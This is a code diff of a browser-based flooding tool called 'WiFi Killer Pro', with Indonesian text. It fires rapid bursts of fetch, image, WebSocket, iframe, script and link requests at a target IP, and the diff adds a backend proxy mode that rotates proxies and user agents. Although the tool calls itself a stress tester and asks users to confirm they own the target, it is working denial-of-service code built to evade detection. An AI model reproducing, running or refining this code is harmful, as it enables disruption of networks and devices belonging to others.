+    img.onerror = function () { finish(true, 'error-but-real'); };
+    try { img.src = target + '/?_=' + randomSeed(); }
+    catch (e) { finish(false, 'exception'); return; }
+
+    setTimeout(function () { finish(false, 'timeout'); }, 1200);
+  }
+
+  /* ==========================================================================
+     ATTACK: FETCH
+     ========================================================================== */
   function sendFetch(target, tag) {
     var start = performance.now();
     var controller = null;
-    try {
-      if (typeof AbortController !== 'undefined') {
-        controller = new AbortController();
-      }
-    } catch (e) { /* ignore */ }
+    try { if (typeof AbortController !== 'undefined') controller = new AbortController(); } catch (e) {}
 
     var timeoutId = null;
     if (controller) {
       timeoutId = setTimeout(function () { try { controller.abort(); } catch (e) {} }, 900);
     }
 
-    return fetch(target + '/?_=' + randomSeed(), {
+    fetch(target + '/?_=' + randomSeed(), {
       method: 'GET',
       mode: 'no-cors',
       cache: 'no-store',
@@ -2456,20 +2455,18 @@ body::after {
       log('SUCCESS', '#' + tag + ' [FETCH] → ' + target + ' (' + elapsed + 'ms)');
       state.reached++;
       updateStats();
-      return true;
     }).catch(function (err) {
       if (timeoutId) clearTimeout(timeoutId);
       var elapsed = Math.round(performance.now() - start);
       var reason = err && err.name ? err.name : 'error';
       log('WARN', '#' + tag + ' [FETCH] → ' + target + ' (' + elapsed + 'ms, ' + reason + ')');
       updateStats();
-      return false;
     });
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 21 — ATTACK METHOD: WEBSOCKET
-     ================================================================= */
+  /* ==========================================================================
+     ATTACK: WEBSOCKET
+     ========================================================================== */
   function sendWebSocket(target, tag) {
     var start = performance.now();
     var ws = null;
@@ -2491,23 +2488,18 @@ body::after {
       updateStats();
     }
 
-    try {
-      ws = new WebSocket(scheme + hostPath + '/?_=' + randomSeed());
-    } catch (e) {
-      log('WARN', '#' + tag + ' [WS] init error: ' + e.message);
-      return;
-    }
+    try { ws = new WebSocket(scheme + hostPath + '/?_=' + randomSeed()); }
+    catch (e) { log('WARN', '#' + tag + ' [WS] init error: ' + e.message); return; }
 
     ws.onopen  = function () { finish(true, 'open'); };
     ws.onerror = function () { finish(false, 'error'); };
     ws.onclose = function () { finish(false, 'closed'); };
-
     setTimeout(function () { finish(false, 'timeout'); }, 1200);
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 22 — ATTACK METHOD: IFRAME INJECTION
-     ================================================================= */
+  /* ==========================================================================
+     ATTACK: IFRAME
+     ========================================================================== */
   function sendIframe(target, tag) {
     var start = performance.now();
     var done = false;
@@ -2516,9 +2508,7 @@ body::after {
     function finish(reached, reason) {
       if (done) return;
       done = true;
-      setTimeout(function () {
-        try { if (iframe && iframe.parentNode) iframe.parentNode.removeChild(iframe); } catch (e) {}
-      }, 200);
+      setTimeout(function () { try { if (iframe && iframe.parentNode) iframe.parentNode.removeChild(iframe); } catch (e) {} }, 200);
       var elapsed = Math.round(performance.now() - start);
       if (reached) {
         log('SUCCESS', '#' + tag + ' [IFRAME] → ' + target + ' (' + elapsed + 'ms)');
@@ -2536,28 +2526,23 @@ body::after {
       iframe.onload = function () { finish(true, 'loaded'); };
       iframe.onerror = function () { finish(false, 'error'); };
       document.body.appendChild(iframe);
-    } catch (e) {
-      finish(false, 'exception');
-      return;
-    }
+    } catch (e) { finish(false, 'exception'); return; }
 
     setTimeout(function () { finish(true, 'timeout-real'); }, 800);
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 23 — ATTACK METHOD: SCRIPT INJECTION
-     ================================================================= */
+  /* ==========================================================================
+     ATTACK: SCRIPT
+     ========================================================================== */
   function sendScript(target, tag) {
     var start = performance.now();
-    var script = null;
     var done = false;
+    var script = null;
 
     function finish(reached, reason) {
       if (done) return;
       done = true;
-      setTimeout(function () {
-        try { if (script && script.parentNode) script.parentNode.removeChild(script); } catch (e) {}
-      }, 200);
+      setTimeout(function () { try { if (script && script.parentNode) script.parentNode.removeChild(script); } catch (e) {} }, 200);
       var elapsed = Math.round(performance.now() - start);
       if (reached) {
         log('SUCCESS', '#' + tag + ' [SCRIPT] → ' + target + ' (' + elapsed + 'ms)');
@@ -2575,28 +2560,23 @@ body::after {
       script.onload = function () { finish(true, 'loaded'); };
       script.onerror = function () { finish(true, 'error-but-real'); };
       document.head.appendChild(script);
-    } catch (e) {
-      finish(false, 'exception');
-      return;
-    }
+    } catch (e) { finish(false, 'exception'); return; }
 
     setTimeout(function () { finish(true, 'timeout-real'); }, 900);
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 24 — ATTACK METHOD: LINK PRELOAD
-     ================================================================= */
+  /* ==========================================================================
+     ATTACK: LINK
+     ========================================================================== */
   function sendLink(target, tag) {
     var start = performance.now();
-    var link = null;
     var done = false;
+    var link = null;
 
     function finish(reached, reason) {
       if (done) return;
       done = true;
-      setTimeout(function () {
-        try { if (link && link.parentNode) link.parentNode.removeChild(link); } catch (e) {}
-      }, 200);
+      setTimeout(function () { try { if (link && link.parentNode) link.parentNode.removeChild(link); } catch (e) {} }, 200);
       var elapsed = Math.round(performance.now() - start);
       if (reached) {
         log('SUCCESS', '#' + tag + ' [LINK] → ' + target + ' (' + elapsed + 'ms)');
@@ -2615,87 +2595,97 @@ body::after {
       link.onload = function () { finish(true, 'loaded'); };
       link.onerror = function () { finish(true, 'error-but-real'); };
       document.head.appendChild(link);
-    } catch (e) {
-      finish(false, 'exception');
-      return;
-    }
+    } catch (e) { finish(false, 'exception'); return; }
 
     setTimeout(function () { finish(true, 'timeout-real'); }, 900);
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 25 — ATTACK METHOD: BACKEND PROXY (Vercel)
-     ================================================================= */
+  /* ==========================================================================
+     ATTACK: BACKEND PROXY (dengan rotasi proxy + UA)
+     ========================================================================== */
   function sendBackendProxy(target, tag) {
-    var url = BACKEND_ENDPOINT + '?target=' + encodeURIComponent(target) + '&_=' + randomSeed();
-    var start = performance.now();
+    var randomProxy = randomFrom(state.proxyList);
+    var randomUA = randomFrom(state.uaList);
 
-    return fetch(url, {
-      method: 'GET',
-      cache: 'no-store'
-    }).then(function (res) {
-      return res.json().then(function (data) {
+    var params = ['target=' + encodeURIComponent(target), '_=' + randomSeed()];
+
+    if (randomProxy) {
+      params.push('proxy=' + encodeURIComponent(randomProxy));
+    }
+    if (randomUA) {
+      params.push('ua=' + encodeURIComponent(randomUA));
+    }
+
+    var url = BACKEND_ENDPOINT + '?' + params.join('&');
+    var start = performance.now();
+    var proxyShort = randomProxy ? String(randomProxy).slice(0, 30) + (randomProxy.length > 30 ? '...' : '') : 'none';
+
+    fetch(url, { method: 'GET', cache: 'no-store' })
+      .then(function (res) {
+        return res.json().then(function (data) {
+          var elapsed = Math.round(performance.now() - start);
+          if (data && data.success) {
+            log('PROXY', '#' + tag + ' [PROXY] → ' + target + ' (server ' + data.elapsed + 'ms, HTTP ' + data.status + ', via ' + proxyShort + ')');
+            state.reached++;
+          } else {
+            var code = (data && data.code) ? data.code : 'unknown';
+            var errMsg = (data && data.error) ? data.error : 'unknown';
+
+            if (code === 'PRIVATE_IP_UNREACHABLE' || code === 'PRIVATE_IP_NO_PROXY') {
+              log('ERROR', '#' + tag + ' [PROXY] → ' + target + ': IP PRIVAT tidak reachable via proxy publik!');
+            } else if (code === 'PROXY_CONNECT_FAILED' || code === 'PROXY_TIMEOUT') {
+              log('WARN', '#' + tag + ' [PROXY] proxy gagal (' + errMsg + ')');
+            } else {
+              log('WARN', '#' + tag + ' [PROXY] → ' + target + ' (' + errMsg + ')');
+            }
+          }
+          updateStats();
+        });
+      })
+      .catch(function (err) {
         var elapsed = Math.round(performance.now() - start);
-        if (data && data.success) {
-          log('PROXY', '#' + tag + ' [PROXY] → ' + target + ' (server ' + data.elapsed + 'ms, HTTP ' + data.status + ')');
-          state.reached++;
-        } else {
-          log('WARN', '#' + tag + ' [PROXY] → ' + target + ' (server error: ' + (data && data.error ? data.error : 'unknown') + ')');
-        }
+        log('ERROR', '#' + tag + ' [PROXY] ' + elapsed + 'ms, ' + (err && err.message ? err.message : 'fail'));
         updateStats();
-        return true;
       });
-    }).catch(function (err) {
-      var elapsed = Math.round(performance.now() - start);
-      log('ERROR', '#' + tag + ' [PROXY] ' + elapsed + 'ms, ' + (err && err.message ? err.message : 'fail'));
-      updateStats();
-      return false;
-    });
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 26 — DISPATCH BY METHOD
-     ================================================================= */
+  /* ==========================================================================
+     DISPATCH
+     ========================================================================== */
   function dispatchOne(target, tag) {
-    var m = state.method;
     if (state.useBackend) {
       sendBackendProxy(target, tag);
       return;
     }
 
-    switch (m) {
-      case 'image':     sendImage(target, tag); break;
-      case 'fetch':     sendFetch(target, tag); break;
-      case 'websocket': sendWebSocket(target, tag); break;
-      case 'iframe':    sendIframe(target, tag); break;
-      case 'script':    sendScript(target, tag); break;
-      case 'link':      sendLink(target, tag); break;
-      case 'mixed':
-      default:
-        // Rotasi metode untuk trafik maksimal
-        var r = tag % 4;
-        if (r === 0)      sendImage(target, tag);
-        else if (r === 1) sendFetch(target, tag);
-        else if (r === 2) sendImage(target, tag);
-        else              sendFetch(target, tag);
-        // Sesekali WS/Iframe/Script/Link
-        if (tag % 17 === 0) sendWebSocket(target, tag);
-        if (tag % 23 === 0) sendIframe(target, tag);
-        if (tag % 29 === 0) sendScript(target, tag);
-        if (tag % 31 === 0) sendLink(target, tag);
-        break;
-    }
+    var m = state.method;
+    if (m === 'image')     { sendImage(target, tag); return; }
+    if (m === 'fetch')     { sendFetch(target, tag); return; }
+    if (m === 'websocket') { sendWebSocket(target, tag); return; }
+    if (m === 'iframe')    { sendIframe(target, tag); return; }
+    if (m === 'script')    { sendScript(target, tag); return; }
+    if (m === 'link')      { sendLink(target, tag); return; }
+
+    var r = tag % 4;
+    if (r === 0)      sendImage(target, tag);
+    else if (r === 1) sendFetch(target, tag);
+    else if (r === 2) sendImage(target, tag);
+    else              sendFetch(target, tag);
+
+    if (tag % 17 === 0) sendWebSocket(target, tag);
+    if (tag % 23 === 0) sendIframe(target, tag);
+    if (tag % 29 === 0) sendScript(target, tag);
+    if (tag % 31 === 0) sendLink(target, tag);
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 27 — ATTACK LOOP TICK
-     ================================================================= */
+  /* ==========================================================================
+     ATTACK LOOP
+     ========================================================================== */
   function attackTick() {
     if (!state.isKilling) return;
     var target = buildTargetUrl();
     if (!target) return;
 
-    // Kirim beberapa request per tick untuk trafik nyata
     var burst = 3;
     if (state.interval <= 30) burst = 5;
     if (state.interval <= 10) burst = 8;
@@ -2706,34 +2696,43 @@ body::after {
     }
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 28 — START ATTACK
-     ================================================================= */
+  /* ==========================================================================
+     START ATTACK
+     ========================================================================== */
   function startAttack() {
     if (state.isKilling) return;
 
     var target = buildTargetUrl();
     if (!target) {
       showAlert('Target Kosong',
-        'Target IP tidak tersedia.\n\n' +
-        'Masukkan IP modul WiFi Anda di kolom Target IP, atau pastikan gateway sudah terdeteksi.',
+        'Target IP tidak tersedia.\n\nMasukkan IP modul WiFi Anda atau tunggu gateway terdeteksi.',
         'fa-triangle-exclamation');
-      log('ERROR', 'Start dibatalkan: target kosong.');
+      log('ERROR', 'Start cancelled: empty target.');
       return;
     }
 
-    // Konfirmasi
-    var mode = state.useBackend ? 'BACKEND PROXY' : 'LANGSUNG DARI BROWSER';
+    var targetHost = normalizeHost(target);
+    if (state.useBackend && isPrivateHostname(targetHost)) {
+      state.useBackend = false;
+      if (el.backendToggle) el.backendToggle.checked = false;
+      log('WARN', 'Auto-fix: proxy disabled (private IP target).');
+      toast('warn', 'Proxy dimatikan otomatis (IP privat)');
+    }
+
+    var mode = state.useBackend ? 'BACKEND PROXY + ROTASI' : 'DIRECT BROWSER';
+    var proxyInfo = state.useBackend
+      ? ('\nProxies available: ' + state.proxyList.length + '\nUAs available: ' + state.uaList.length)
+      : '';
+
     showAlert('Konfirmasi Serangan',
-      'Target: ' + target + '\n' +
-      'Metode: ' + state.method.toUpperCase() + '\n' +
-      'Intensitas: ' + state.interval + 'ms\n' +
-      'Mode: ' + mode + '\n\n' +
-      'Pastikan ini modul WiFi milik Anda sendiri.\n' +
-      'Lanjutkan?',
+      'Target: ' + (targetHost || target) + '\n' +
+      'Port: ' + getActivePort() + '\n' +
+      'Method: ' + state.method.toUpperCase() + '\n' +
+      'Intensity: ' + state.interval + 'ms\n' +
+      'Mode: ' + mode + proxyInfo + '\n\n' +
+      'Pastikan ini modul WiFi milik Anda sendiri.\nLanjutkan?',
       'fa-skull-crossbones');
 
-    // Ganti tombol OK untuk confirm
     el.alertOkBtn.onclick = function () {
       closeAlert();
       el.alertOkBtn.onclick = closeAlert;
@@ -2751,14 +2750,17 @@ body::after {
     log('INFO', 'Target: ' + target);
     log('INFO', 'Method: ' + state.method);
     log('INFO', 'Intensity: ' + state.interval + 'ms');
-    log('INFO', 'Mode: ' + (state.useBackend ? 'BACKEND PROXY' : 'DIRECT BROWSER'));
-    log('INFO', 'Semua request berikut adalah request HTTP NYATA ke target.');
+    log('INFO', 'Mode: ' + (state.useBackend ? 'BACKEND PROXY + ROTASI' : 'DIRECT BROWSER'));
+    if (state.useBackend) {
+      log('PROXY', 'Proxies in pool: ' + state.proxyList.length);
+      log('PROXY', 'UAs in pool: ' + state.uaList.length);
+    }
+    log('INFO', 'Semua request adalah HTTP NYATA ke target.');
     log('ATTACK', '═══════════════════════════════');
 
     if (el.attackBtn) el.attackBtn.classList.add('stop');
     if (el.attackBtnText) el.attackBtnText.textContent = 'STOP ATTACK';
     if (el.progressBox) el.progressBox.classList.add('active');
-    if (el.progressText) el.progressText.textContent = 'ATTACK IN PROGRESS...';
     if (el.consoleDot) el.consoleDot.classList.add('active');
     updateStats();
     updateNetworkUI();
@@ -2766,9 +2768,9 @@ body::after {
     state.attackTimer = setInterval(attackTick, state.interval);
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 29 — STOP ATTACK
-     ================================================================= */
+  /* ==========================================================================
+     STOP ATTACK
+     ========================================================================== */
   function stopAttack() {
     if (!state.isKilling) return;
     state.isKilling = false;
@@ -2790,14 +2792,16 @@ body::after {
     if (el.consoleDot) el.consoleDot.classList.remove('active');
     updateStats();
 
-    showAlert('Stopped', 'Attack dihentikan.\n\n' +
-      'Attempts: ' + state.attempts + '\nReached: ' + state.reached,
+    showAlert('Stopped',
+      'Attack dihentikan.\n\n' +
+      'Attempts: ' + state.attempts + '\n' +
+      'Reached: ' + state.reached,
       'fa-circle-stop');
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 30 — UPDATE STATS
-     ================================================================= */
+  /* ==========================================================================
+     UPDATE STATS
+     ========================================================================== */
   function updateStats() {
     if (el.statAttempts) el.statAttempts.textContent = state.attempts;
     if (el.statReached) el.statReached.textContent = state.reached;
@@ -2812,11 +2816,10 @@ body::after {
     }
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 31 — EVENT BINDING
-     ================================================================= */
+  /* ==========================================================================
+     EVENTS
+     ========================================================================== */
   function bindEvents() {
-    // Attack button
     if (el.attackBtn) {
       el.attackBtn.addEventListener('click', function () {
         if (state.isKilling) stopAttack();
@@ -2824,11 +2827,9 @@ body::after {
       });
     }
 
-    // Console buttons
     if (el.clearLogBtn) el.clearLogBtn.addEventListener('click', clearLog);
     if (el.copyLogBtn) el.copyLogBtn.addEventListener('click', copyLog);
 
-    // Modal
     if (el.alertOkBtn) el.alertOkBtn.addEventListener('click', closeAlert);
     if (el.alertModal) {
       el.alertModal.addEventListener('click', function (e) {
@@ -2836,96 +2837,87 @@ body::after {
       });
     }
 
-    // Refresh network
     if (el.refreshNetBtn) el.refreshNetBtn.addEventListener('click', refreshNetwork);
+    if (el.refreshPoolBtn) {
+      el.refreshPoolBtn.addEventListener('click', function () {
+        log('INFO', 'Reloading pool...');
+        loadPool();
+      });
+    }
 
-    // Recheck permission
     if (el.recheckPermBtn) {
       el.recheckPermBtn.addEventListener('click', function () {
         log('INFO', '=== Re-checking permission ===');
         checkPermission();
         requestLocationPermission().then(function (granted) {
-          if (!granted) {
-            log('WARN', 'Izin lokasi belum diberikan.');
-          }
+          if (!granted) log('WARN', 'Location not granted.');
           refreshNetwork();
         });
       });
     }
 
-    // Target input
     if (el.targetInput) {
-      el.targetInput.addEventListener('input', updateNetworkUI);
+      el.targetInput.addEventListener('input', function () {
+        updateNetworkUI();
+        checkProxyCompatibility();
+      });
     }
-    if (el.portInput) {
-      el.portInput.addEventListener('input', updateNetworkUI);
-    }
+    if (el.portInput) el.portInput.addEventListener('input', updateNetworkUI);
 
-    // Method select
     if (el.methodSelect) {
       el.methodSelect.addEventListener('change', function () {
         state.method = el.methodSelect.value;
-        log('INFO', 'Method diubah: ' + state.method);
+        log('INFO', 'Method: ' + state.method);
       });
     }
 
-    // Intensity select
     if (el.intensitySelect) {
       el.intensitySelect.addEventListener('change', function () {
         var v = el.intensitySelect.value;
         state.interval = INTERVAL_MAP[v] || 60;
-        log('INFO', 'Intensity diubah: ' + v + ' (' + state.interval + 'ms)');
+        log('INFO', 'Intensity: ' + v + ' (' + state.interval + 'ms)');
         if (state.isKilling) {
-          // Restart timer dengan interval baru
           if (state.attackTimer) clearInterval(state.attackTimer);
           state.attackTimer = setInterval(attackTick, state.interval);
         }
       });
     }
 
-    // Backend toggle
     if (el.backendToggle) {
       el.backendToggle.addEventListener('change', function () {
         state.useBackend = el.backendToggle.checked;
         if (state.useBackend) {
-          log('PROXY', 'Backend proxy AKTIF. Request dikirim dari Vercel server.');
-          toast('info', 'Backend proxy aktif (target harus public)');
+          log('PROXY', 'Backend proxy ACTIVE.');
+          toast('info', 'Backend proxy aktif');
         } else {
-          log('INFO', 'Backend proxy NONAKTIF. Request dikirim langsung dari browser.');
+          log('INFO', 'Backend proxy INACTIVE.');
           toast('info', 'Direct mode aktif');
         }
+        checkProxyCompatibility();
       });
     }
 
-    // Online/offline
     window.addEventListener('online', function () {
       log('SUCCESS', 'Network: ONLINE');
       checkPermission();
     });
+
     window.addEventListener('offline', function () {
       log('WARN', 'Network: OFFLINE');
       setPermStatus(el.permNetworkStatus, 'denied', 'OFFLINE', 'fa-wifi-slash');
     });
 
-    // Before unload
     window.addEventListener('beforeunload', function () {
       if (state.isKilling) {
         state.isKilling = false;
         if (state.attackTimer) clearInterval(state.attackTimer);
       }
     });
-
-    // Visibility change (pause on hidden)
-    document.addEventListener('visibilitychange', function () {
-      if (document.hidden && state.isKilling) {
-        log('WARN', 'Halaman tidak aktif. Attack tetap berjalan di background timer.');
-      }
-    });
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 32 — INITIAL LOAD SEQUENCE
-     ================================================================= */
+  /* ==========================================================================
+     INIT
+     ========================================================================== */
   function init() {
     cacheDom();
 
@@ -2933,62 +2925,42 @@ body::after {
     log('INFO', 'WiFi Killer Pro v' + APP_VERSION);
     log('INFO', 'Real Network Stress Tester');
     log('INFO', 'Time: ' + new Date().toISOString());
-    log('INFO', 'UA: ' + navigator.userAgent.slice(0, 100));
     log('INFO', '═══════════════════════════════');
 
-    // Init scroll reveal
     initReveal();
-
-    // Bind events
     bindEvents();
 
-    // Init state values from inputs
-    if (el.intensitySelect) {
-      state.interval = INTERVAL_MAP[el.intensitySelect.value] || 60;
-    }
-    if (el.methodSelect) {
-      state.method = el.methodSelect.value;
-    }
+    if (el.intensitySelect) state.interval = INTERVAL_MAP[el.intensitySelect.value] || 60;
+    if (el.methodSelect) state.method = el.methodSelect.value;
 
-    // 1. Permission check
     checkPermission();
+    loadPool();
 
-    // 2. Location request + network refresh
     requestLocationPermission().then(function (granted) {
-      if (!granted) {
-        log('WARN', 'Izin lokasi tidak diberikan.');
-        toast('warn', 'Izin lokasi ditolak — IP lokal mungkin tidak terdeteksi', 4000);
-      }
-      // Setelah itu refresh network
+      if (!granted) log('WARN', 'Location not granted.');
       refreshNetwork();
     });
 
-    // 3. Hook NetworkInfo change
     var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     if (conn && conn.addEventListener) {
       conn.addEventListener('change', function () {
-        log('INFO', 'Network Info berubah.');
+        log('INFO', 'Network changed.');
         loadNetworkInfoAPI();
         updateNetworkUI();
       });
     }
 
-    // 4. Verify Font Awesome loaded
     setTimeout(function () {
       var testIcon = document.createElement('i');
       testIcon.className = 'fas fa-check';
       testIcon.style.cssText = 'position:absolute;left:-9999px;';
       document.body.appendChild(testIcon);
-      var fontFamily = getComputedStyle(testIcon).fontFamily || '';
-      if (fontFamily.indexOf('Font Awesome') === -1) {
-        log('WARN', 'Font Awesome mungkin gagal dimuat. Cek koneksi internet.');
-      } else {
-        log('SUCCESS', 'Font Awesome dimuat.');
-      }
+      var ff = getComputedStyle(testIcon).fontFamily || '';
+      if (ff.indexOf('Font Awesome') === -1) log('WARN', 'Font Awesome not loaded.');
+      else log('SUCCESS', 'Font Awesome OK.');
       document.body.removeChild(testIcon);
     }, 1500);
 
-    // 5. Auto refresh network setelah 3 detik
     setTimeout(function () {
       if (state.localIp === '-') {
         log('INFO', 'Auto-retry network detection...');
@@ -2996,14 +2968,10 @@ body::after {
       }
     }, 3000);
 
-    // 6. Console ready
-    log('SUCCESS', 'Ready. Klik START KILL untuk memulai attack.');
+    log('SUCCESS', 'Ready. Press START KILL to begin.');
     toast('success', 'WiFi Killer Pro siap');
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 33 — BOOTSTRAP
-     ================================================================= */
   if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', init);
   } else {
@@ -3012,74 +2980,6 @@ body::after {
 
 })();
 </script>
-
-<!-- =============================================================
-     DOKUMENTASI: CARA PASANG BRIDGE DI APK ANDROID
-     (Untuk dipakai di WebView APK Anda)
-
-     ── Java (MainActivity.java) ──────────────────────────────
-
-     webView.getSettings().setJavaScriptEnabled(true);
-     webView.getSettings().setDomStorageEnabled(true);
-     webView.getSettings().setMixedContentMode(
-         WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
-     ); // penting agar HTTP ke 192.168.x.x tidak diblok
-
-     // Bridge permission
-     webView.addJavascriptInterface(new Object() {
-
-         @JavascriptInterface
-         public boolean hasLocationPermission() {
-             return ContextCompat.checkSelfPermission(
-                 MainActivity.this,
-                 Manifest.permission.ACCESS_FINE_LOCATION
-             ) == PackageManager.PERMISSION_GRANTED;
-         }
-
-         @JavascriptInterface
-         public void requestLocationPermission() {
-             ActivityCompat.requestPermissions(
-                 MainActivity.this,
-                 new String[]{ Manifest.permission.ACCESS_FINE_LOCATION },
-                 1001
-             );
-         }
-
-         @JavascriptInterface
-         public String getPermissionStatus(String name) {
-             if ("LOCATION".equals(name)) {
-                 return hasLocationPermission() ? "granted" : "denied";
-             }
-             return "unknown";
-         }
-
-     }, "Android"); // nama "Android" → JS: window.Android
-
-     // Geolocation callback (agar navigator.geolocation juga bekerja)
-     webView.setWebChromeClient(new WebChromeClient() {
-         @Override
-         public void onGeolocationPermissionsShowPrompt(
-             String origin, Callback callback) {
-             callback.invoke(origin, true, false);
-         }
-     });
-
-     ── AndroidManifest.xml ──────────────────────────────────
-
-     <uses-permission android:name="android.permission.INTERNET"/>
-     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
-     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
-     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
-     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
-
-     ── Catatan ──────────────────────────────────────────────
-     • Bridge harus bernama "Android" / "AndroidBridge" / "NativeBridge" /
-       "WebViewBridge" / "AndroidInterface" / "JSBridge" / "AppBridge" /
-       "ReactNativeWebView" — semua nama ini dideteksi otomatis oleh JS.
-     • HTML tidak butuh perubahan apapun — sudah auto-detect bridge.
-     • MIXED_CONTENT_ALWAYS_ALLOW wajib supaya fetch ke http://192.168.x.x
-       tidak diblok saat HTML di-serve dari https://.
-============================================================== -->
 
 </body>
 </html>
